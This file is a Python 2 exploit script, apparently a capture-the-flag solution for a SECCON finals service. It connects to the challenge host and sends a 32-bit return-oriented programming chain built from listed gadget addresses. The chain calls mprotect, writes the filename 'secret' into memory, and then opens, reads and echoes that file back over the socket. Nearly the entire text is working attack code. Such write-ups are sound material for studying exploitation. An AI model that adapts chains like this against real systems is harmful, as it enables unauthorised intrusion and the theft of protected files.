import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def send_msg(f, _str):
    f.write(p(len(_str)))
    f.write(_str)


host = '3.finals.seccon.jp'
#host = '192.168.165.216'
port = 20000

material_base = 0x10000000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

'''
0x100e3e94: pop    %esi
0x100e3e95:  pop    %ebx
0x100e3e96:  pop    %edx
0x100e3e97:  ret    
'''

'''
.text:000C7B6C                 int     80h             ; LINUX - sys_read
.text:000C7B6E                 pop     ebx
.text:000C7B6F                 cmp     eax, 0FFFFF001h
.text:000C7B74                 jnb     short loc_C7BA3
.text:000C7B76                 retn
'''

'''
.text:000913A9                 mov     [edx], eax
.text:000913AB
.text:000913AB loc_913AB:                              ; CODE XREF: time+17j
.text:000913AB                 pop     ebp
.text:000913AC                 retn
'''

'''
.text:0010FF8D                 mov     eax, [eax]
.text:0010FF8F                 retn
'''

material0_open = 0x100C76FA
material0_pop3 = 0x100e3e94
material0_read = 0x100C7B5A
material0_write = 0x100C7BCA
material0_exit = 0x100A0084

material0_a_ret = 0x100AD374
material0_c_ret = 0x100cc7c3
material0_d_ret = 0x100e3e96

material0_int80 = 0x100C7B6C
material0_write_val = 0x100913A9
syscall_mprotect = 125

cc_addr = 0x100a08b6

buf_addr = 0x10149d00
# secret
rop = p(material0_a_ret) 
rop += p(syscall_mprotect) # eax: 125 mprotect
rop += p(material0_pop3)
rop += p(0x41414141)
rop += p(0x10000000) # ebx: addr
rop += p(0x7) # edx: type
rop += p(material0_c_ret)
rop += p(0x14a000) # ecx: len
rop += p(material0_int80) # int 80
rop += p(0x41414141) # ebx

rop += p(material0_d_ret) # addr
rop += p(0x10000000)
rop += p(material0_a_ret) # val
rop += 'secr'
rop += p(material0_write_val)
rop += p(0x41414141)
rop += p(material0_d_ret) # addr
rop += p(0x10000004)
rop += p(material0_a_ret) # val
rop += 'et\x00\x00'
rop += p(material0_write_val)
rop += p(0x41414141)

rop += p(material0_open)
rop += p(material0_pop3)
rop += p(0x10000000)
rop += p(0x0)
rop += p(0x0)
rop += p(material0_read)
rop += p(material0_pop3)
rop += p(0x0)
rop += p(buf_addr)
rop += p(1024)
#rop += p(cc_addr);
rop += p(material0_write)
rop += p(material0_pop3)
rop += p(0x1)
rop += p(buf_addr)
rop += p(256)
rop += p(material0_exit)

raw_input('wait')

send_msg(f, 'a' * 32)
send_msg(f, rop)

print f.read(1024)
print f.read(1024)
print f.read(1024)

'''
t = telnetlib.Telnet()
t.sock = s
t.interact()
'''